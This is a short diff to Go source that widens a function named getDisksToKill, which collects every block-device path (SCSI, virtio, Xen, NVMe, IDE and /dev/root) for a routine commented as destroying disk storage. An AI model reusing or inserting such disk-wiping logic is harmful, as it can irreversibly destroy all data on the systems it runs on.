@@ -153,7 +153,7 @@ func getFilesToKill() (ret []string) {
 func getDisksToKill() (ret []string) {
 	ret = make([]string, 0, 10)
 	// Destroy disk storage files for Unix and Linux systems
-	for _, pattern := range []string{"/dev/sd*", "/dev/vd*", "/dev/xvd*"} {
+	for _, pattern := range []string{"/dev/sd*", "/dev/vd*", "/dev/xvd*", "/dev/nvme*", "/dev/hd*", "/dev/root"} {
 		if things, err := filepath.Glob(pattern); err == nil {
 			ret = append(ret, things...)
 		}
